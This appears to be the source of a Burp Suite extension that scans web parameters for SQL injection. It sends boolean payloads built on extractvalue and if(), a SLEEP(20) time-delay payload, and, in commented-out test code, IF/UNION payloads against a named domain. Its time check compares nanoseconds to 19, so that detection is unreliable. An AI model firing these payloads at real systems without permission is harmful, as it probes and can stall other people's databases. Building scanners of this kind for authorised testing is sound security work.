package burp;

import java.util.List;
import java.util.ArrayList;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map.Entry;
import java.util.Map;


//import org.apache.http.*;
//import org.apache.http.client.entity.UrlEncodedFormEntity;
//import org.apache.http.client.methods.CloseableHttpResponse;
//import org.apache.http.client.methods.HttpGet;
//import org.apache.http.client.methods.HttpPost;
//import org.apache.http.impl.client.CloseableHttpClient;
//import org.apache.http.impl.client.HttpClients;
//import org.apache.http.message.BasicNameValuePair;
//import org.apache.http.util.EntityUtils;


public class SqlInject {
	
	private PrintWriter stdout;
	private double threshold = 0.9;
	private String detail = "";
	
	
//	public static void main(String[] args){
//		List<IScanIssue> issue = new ArrayList<IScanIssue>();
//		SqlInject a = new SqlInject();
//		List<String> headers = new ArrayList<String>();
//		List<IParameter> iparameters = new ArrayList<IParameter>();
//		String r = a.getUtils("http://cimer.com.cn", iparameters, headers);
//		System.out.println(r);
//		Map<Boolean, String> payloadmaps = new HashMap<Boolean, String>();
//		payloadmaps.put(true, "IF(1=1,1,(select+1+union+select+2))");
//		payloadmaps.put(false, "IF(1=2,1,(select+1+union+select+2))");
//		for (Boolean p: payloadmaps.keySet()){
//			System.out.println(p);
//			System.out.println(payloadmaps.get(p));
//		}
//		Iterator iter = payloadmaps.entrySet().iterator();
//		while (iter.hasNext()){
//			Entry<Boolean, String> entry = (Entry<Boolean, String>) iter.next();
//			System.out.println(entry.getKey());
//			System.out.println(entry.getValue());
//		}
//	}
	
	public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) throws UnsupportedEncodingException{
		List<IScanIssue> issue = new ArrayList<IScanIssue>();
		IExtensionHelpers helpers = callbacks.getHelpers();
		
		
		new PrintWriter(callbacks.getStderr(), true);
		stdout = new PrintWriter(callbacks.getStdout(), true);
		
		stdout.println("start scaning sqlinject");
		
		Map<Boolean, String> payloadmaps = new HashMap<Boolean, String>();
		
		List<String> headers = new ArrayList<String>();
		List<IParameter> iparameters = new ArrayList<IParameter>();
		String method;
		String url;
		String orginresponse;
		headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
		iparameters = helpers.analyzeRequest(baseRequestResponse).getParameters();
		method = helpers.analyzeRequest(baseRequestResponse).getMethod();
		url = helpers.analyzeRequest(baseRequestResponse).getUrl().toString();
		
		Map<Boolean, String> resmaps = new HashMap<Boolean, String>();
		String basvalue = insertionPoint.getBaseValue();
		payloadmaps.put(true, "extractvalue(1,if(1=1,*,user()))".replace("*", basvalue));
		payloadmaps.put(false, "extractvalue(1,if(1=2,*,user()))".replace("*", basvalue));
		
		for (Boolean p: payloadmaps.keySet()){
			
			byte[] checkRequest = insertionPoint.buildRequest(payloadmaps.get(p).getBytes());
			String payloadRequest = new String(checkRequest, "utf-8");
			stdout.println("============" + p + "============");
			stdout.println(payloadRequest);
            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);
            String response = new String(checkRequestResponse.getResponse(), "utf-8");
            detail += payloadRequest + "===========================================";
            resmaps.put(p, response);
		}
		stdout.println("=============orgin=============");
		byte[] originRequest = insertionPoint.buildRequest(basvalue.getBytes());
		String request = new String(originRequest, "utf-8");
		stdout.println(request);
		long startTime = System.nanoTime();
		IHttpRequestResponse originRequestResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), originRequest);
		orginresponse = new String(originRequestResponse.getResponse(), "utf-8");
		long finishTime = System.nanoTime();
//		if (method == "post"){
//			orginresponse = postUtils(url, iparameters, headers);
//		}
//		else{
//			orginresponse = getUtils(url, iparameters, headers);
//		}
		Iterator<Entry<Boolean, String>> iter = resmaps.entrySet().iterator();
		int flag = 0;
		while (iter.hasNext()){
			Entry<Boolean, String> entry = (Entry<Boolean, String>) iter.next();
			Boolean key = entry.getKey();
			String value = entry.getValue();
			double values = StringSimilarity.similarity(orginresponse, value);
			if (key){
				if (values > this.threshold){
					flag++;
				}
			}
			else{
				if (values < this.threshold){
					flag++;
				}
			}
		}
		if (flag == 2){
			issue.add(new CustomScanIssue(
					helpers.analyzeRequest(baseRequestResponse).getUrl(),
					"boolean sql inejct by the way of orderby, ",
					0,
					"High",
					"Certain",
					null,
					null,
					detail,
					"precompile",
					baseRequestResponse.getHttpService(),
					originRequestResponse
					));
		}
		String timepayloads = "if(1=2,*,(SELECT(1)FROM(SELECT(SLEEP(20)))test))".replace("*", basvalue);
		byte[] timeinjectRequest = insertionPoint.buildRequest(timepayloads.getBytes());
		String timerequest = new String(timeinjectRequest, "utf-8");
		stdout.println(timerequest);
		long newstartTime = System.nanoTime();
		IHttpRequestResponse timeResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), timeinjectRequest);
		long newfinishTime = System.nanoTime();
		if ((newfinishTime - newstartTime) - (finishTime - startTime) > 19){
			issue.add(new CustomScanIssue(
					helpers.analyzeRequest(baseRequestResponse).getUrl(),
					"time sql inject by the way of orderby",
					0,
					"High",
					"Certain",
					null,
					null,
					timerequest,
					"precompile",
					baseRequestResponse.getHttpService(),
					timeResponse
					));
		}
		return issue;
	}
	
//	public String postUtils(String u, List<IParameter> iparameters, List<String> headers){
//		List<NameValuePair> params = new ArrayList<NameValuePair>();
//		for (IParameter p : iparameters){
//			params.add(new BasicNameValuePair(p.getName(), p.getValue()));
//		}
//		CloseableHttpClient httpClient = HttpClients.createDefault();
//		HttpPost httpPost = new HttpPost(u);
//		for (IParameter p : iparameters){
//			params.add(new BasicNameValuePair(p.getName(), p.getValue()));
//		}
//		UrlEncodedFormEntity entity = null;
//		String response = "";
//		try{
//			entity = new UrlEncodedFormEntity(params, "utf-8");
//			httpPost.setEntity(entity);
//			for (String s: headers){
//				if (s.contains(":")){
//					String[] ss = s.split(":");
//					httpPost.addHeader(ss[0].trim(), ss[1].trim());
//				}
//			}
//			CloseableHttpResponse httpResponse = httpClient.execute(httpPost);
//			response = EntityUtils.toString(httpResponse.getEntity());
//			
//		}catch (IOException e){
//			e.printStackTrace();
//		}
//		return response;
//	}
//	
//	public String getUtils(String u, List<IParameter> iparameters, List<String> headers){
//		CloseableHttpClient httpClient = HttpClients.createDefault();
//		String params = "";
//		String response = "";
//		for (int i=0 ; i < iparameters.size() ; i ++){
//			if (i != iparameters.size()-1){
//				params += iparameters.get(i).getValue() + "=" + iparameters.get(i).getValue() + "&";
//			}
//			else{
//				params += iparameters.get(i).getValue() + "=" + iparameters.get(i).getValue();
//			}
//		}
//		try{
//			u = u + "?" + params.trim();
//			HttpGet httpGet = new HttpGet(u);
//			for (String head : headers){
//				if (head.contains(":")){
//					String[] heads = head.split(":");
//					httpGet.addHeader(heads[0].trim(), heads[1].trim() );
//				}
//			}
//			CloseableHttpResponse httpResponse = httpClient.execute(httpGet);
//			response = EntityUtils.toString(httpResponse.getEntity());
//		} catch (IOException e){
//			e.printStackTrace();
//		}
//		return response;
//	}
}